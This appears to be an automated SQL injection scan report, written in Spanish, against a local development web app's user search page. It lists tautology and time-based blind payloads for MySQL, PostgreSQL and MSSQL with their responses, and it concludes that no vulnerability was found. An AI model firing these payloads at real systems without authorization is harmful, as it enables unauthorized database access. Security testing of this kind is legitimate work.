# Informe de análisis SQLi
Fecha (UTC): 2026-04-13T07:45:03

Objetivo: http://web.dev.local:8083/

Resultados:

Baseline: (200, 0.01, 2576, [], '\r\n<!DOCTYPE html>\r\n<html lang="es">\r\n<head>\r\n    <meta charset="UTF-8">\r\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\r\n    <title>Search Users</title>\r\n    <style>\r\n        body {\r\n            font-family: Arial, sans-serif;\r\n            max-width: 800px;\r\n            margin: 0 auto;\r\n            padding: 20px;\r\n            background-color: #f5f5f5;\r\n        }\r\n     ')

- normal: payload='1' -> (200, 0.007, 2576, [], '\r\n<!DOCTYPE html>\r\n<html lang="es">\r\n<head>\r\n    <meta charset="UTF-8">\r\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\r\n    <title>Search Users</title>\r\n    <style>\r\n        body {\r\n            font-family: Arial, sans-serif;\r\n            max-width: 800px;\r\n            margin: 0 auto;\r\n            padding: 20px;\r\n            background-color: #f5f5f5;\r\n        }\r\n     ')
- or_true: payload="' OR '1'='1" -> (200, 0.007, 2576, [], '\r\n<!DOCTYPE html>\r\n<html lang="es">\r\n<head>\r\n    <meta charset="UTF-8">\r\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\r\n    <title>Search Users</title>\r\n    <style>\r\n        body {\r\n            font-family: Arial, sans-serif;\r\n            max-width: 800px;\r\n            margin: 0 auto;\r\n            padding: 20px;\r\n            background-color: #f5f5f5;\r\n        }\r\n     ')
- or_true2: payload="' OR 1=1--" -> (200, 0.005, 2576, [], '\r\n<!DOCTYPE html>\r\n<html lang="es">\r\n<head>\r\n    <meta charset="UTF-8">\r\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\r\n    <title>Search Users</title>\r\n    <style>\r\n        body {\r\n            font-family: Arial, sans-serif;\r\n            max-width: 800px;\r\n            margin: 0 auto;\r\n            padding: 20px;\r\n            background-color: #f5f5f5;\r\n        }\r\n     ')
- mysql_sleep: payload="1' AND SLEEP(5)-- " -> (200, 0.008, 2576, [], '\r\n<!DOCTYPE html>\r\n<html lang="es">\r\n<head>\r\n    <meta charset="UTF-8">\r\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\r\n    <title>Search Users</title>\r\n    <style>\r\n        body {\r\n            font-family: Arial, sans-serif;\r\n            max-width: 800px;\r\n            margin: 0 auto;\r\n            padding: 20px;\r\n            background-color: #f5f5f5;\r\n        }\r\n     ')
- pg_sleep: payload="1' AND pg_sleep(5)-- " -> (200, 0.007, 2576, [], '\r\n<!DOCTYPE html>\r\n<html lang="es">\r\n<head>\r\n    <meta charset="UTF-8">\r\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\r\n    <title>Search Users</title>\r\n    <style>\r\n        body {\r\n            font-family: Arial, sans-serif;\r\n            max-width: 800px;\r\n            margin: 0 auto;\r\n            padding: 20px;\r\n            background-color: #f5f5f5;\r\n        }\r\n     ')
- mssql_waitfor: payload="1'; WAITFOR DELAY '0:0:5'-- " -> (200, 0.004, 2576, [], '\r\n<!DOCTYPE html>\r\n<html lang="es">\r\n<head>\r\n    <meta charset="UTF-8">\r\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\r\n    <title>Search Users</title>\r\n    <style>\r\n        body {\r\n            font-family: Arial, sans-serif;\r\n            max-width: 800px;\r\n            margin: 0 auto;\r\n            padding: 20px;\r\n            background-color: #f5f5f5;\r\n        }\r\n     ')

Conclusión:
VULN_FOUND: False
VULN_EXPLOITED: False
